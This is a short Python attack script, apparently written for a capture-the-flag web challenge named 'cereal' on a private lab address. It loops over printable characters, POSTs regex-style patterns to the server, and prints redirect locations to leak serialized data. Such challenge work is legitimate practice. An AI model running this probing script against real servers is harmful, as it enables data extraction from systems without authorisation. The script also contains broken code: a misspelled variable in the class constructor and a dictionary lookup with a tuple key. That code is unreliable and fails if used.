#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Sep 18 20:59:51 2021

@author: crr0tz
"""

import requests
from urllib.parse import unquote

class Cereal(object):
    def __init__(self, log, cereal):
        self.log = log
        self.cereal = ceral

def object_hook(log, cereal, d):
    cls = {'Cereal': Cereal}[log,cereal]
    return cls(**d)



url = 'http://172.18.10.105:30262'
base = 'cereal_check.php?'
for c in range(20, 126):
    cereal = '.+' + chr(c) + '.+'
    req = requests.post(url, {"cereal": cereal})
    if req.history:
        for r in req.history:
            print(r.text.split('\n')[-1])
            Location = r.headers['Location']
            cerealized = unquote(Location.split('=')[1])        
            print(cerealized)